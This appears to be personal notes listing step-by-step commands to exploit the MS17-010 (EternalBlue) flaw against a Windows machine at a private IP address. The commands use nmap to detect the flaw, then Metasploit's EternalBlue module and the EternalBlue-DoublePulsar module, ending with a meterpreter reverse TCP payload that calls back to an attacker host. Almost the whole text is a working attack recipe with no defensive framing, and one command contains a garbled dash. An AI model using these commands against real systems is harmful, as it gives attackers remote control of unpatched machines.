1.- cd /usr/share/nmap/scripts/
2.- wget https://svn.nmap.org/nmap/scripts/smb-vuln-ms17-010.nse 
3.- nmap -d -sC -p445 -script smb-vuln-ms17-010.nse 192.168.30.246
4.- wget https://raw.githubusercontent.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/master/eternalblue_doublepulsar.rb
5.- cd /usr/share/metasploit-framework/modules/exploits/windows/smb/
6.- cp eternalblue_doublepulsar.rb .

7.- msfconsole
8.- use auxiliary/scanner/smb/smb_ms17_010
9.- show options
10.- set rhosts 192.168.30.246
11.- exploit
12.- use exploit/windows/smb/ms17_010_eternalblue
13.- show options
14.- set rhost 192.168.30.246
15.- exploit

16.- ------WIN--------


17.- with doublepulsar

apt-get update -y
apt-get upgrade -y
apt-get install wine -y
apt-get install winetricks -y
dpkg â€“add-architecture i386 && apt-get update && apt-get install wine32 -y


git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git

18.- msfconsole
19.- use exploit/windows/smb/eternalblue_doublepulsar
20.- show targets
21.- set target 8
22.- set payload windows/x64/meterpreter/reverse_tcp
23.- set processinject explorer.exe
24.- set targetarchitecture x64
25.- set rhost 192.168.30.246
26.- set lhost 192.168.30.149
27.- set lport 4444
28.- run
